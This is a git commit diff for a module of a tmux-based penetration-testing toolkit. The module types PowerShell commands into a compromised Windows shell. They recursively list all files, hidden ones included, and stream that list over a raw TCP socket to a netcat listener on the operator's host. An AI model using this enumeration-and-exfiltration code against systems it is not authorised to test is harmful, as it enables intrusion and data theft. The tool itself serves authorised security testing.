2be797ca999676082067d4bcab579e72fd4520b1
Matthias Fulz <mfulz@olznet.de>
2023-11-17 01:30:55 +0100

    Features
    - Commander / powershell_fetch_socket: Using file to select files

--- modules/auxiliary/misc/commander/commands/comm/files/powershell_fetch_socket.sh
+++ modules/auxiliary/misc/commander/commands/comm/files/powershell_fetch_socket.sh
@@ -4,32 +4,41 @@ _CMD_CURRENT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 _fetch_file_list() {
   local pane_id="$1"
+  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
+  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
+  local files_list_file="$(mktemp)"
   local files
-  local files_hidden
 
-  tmux send-keys -t "$pane_id" "clear" Enter
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName' Enter
-  sleep 1
-  files="$(tmux capture-pane -t "$pane_id" -p)"
-  files="$(echo "$files" | tail -n +2 | head -n -1)"
-  tmux send-keys -t "$pane_id" "clear" Enter
+  tmux send-keys -t "$pane_id" '$FileName = Get-ChildItem $TEMP\fl.txt | Select Name -ExpandProperty FullName' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $FileName' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $FileName' Enter
 
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName' Enter
-  sleep 1
-  files_hidden="$(tmux capture-pane -t "$pane_id" -p)"
-  files_hidden="$(echo "$files_hidden" | tail -n +2 | head -n -1)"
-  files="$(printf "%s\n%s" "$files" "$files_hidden")"
-  tmux send-keys -t "$pane_id" "clear" Enter
+  tmux new-window -P -d "nc -nlvp \"$lport\" > \"$files_list_file\""
 
-  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(echo "$files" | fzf --cycle --border="sharp")"
+  tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
+  tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
+  tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
+  tmux send-keys -t "$pane_id" '$Stream = $TcpClient.GetStream()' Enter
+  tmux send-keys -t "$pane_id" 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
+  tmux send-keys -t "$pane_id" '$FileStream.Close()' Enter
+  tmux send-keys -t "$pane_id" '$Stream.Dispose()' Enter
+  tmux send-keys -t "$pane_id" '$TcpClient.Dispose()' Enter
+
+  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(cat "$files_list_file" | fzf --cycle --border="sharp")"
+  rm "$files_list_file"
 }
 
 commander_run() {
   local pane_id="$1"
-  # local file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
   tmux display-popup -w 80% -h 80% -E "$_CMD_CURRENT_DIR/powershell_fetch_socket.sh \"$pane_id\""
   local file_to_fetch="$(tmux show-options -t "$pane_id" -pqv "@penmux-commander-pfs-hidden-file")"
   tmux set-option -pu "@penmux-commander-pfs-hidden-file"
+
+  if [[ -z "$file_to_fetch" ]]; then
+    file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
+  fi
+
+  [[ -z "$file_to_fetch" ]] && return
 
   local dst_file="###SessionDir###Files/${file_to_fetch}"
   dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
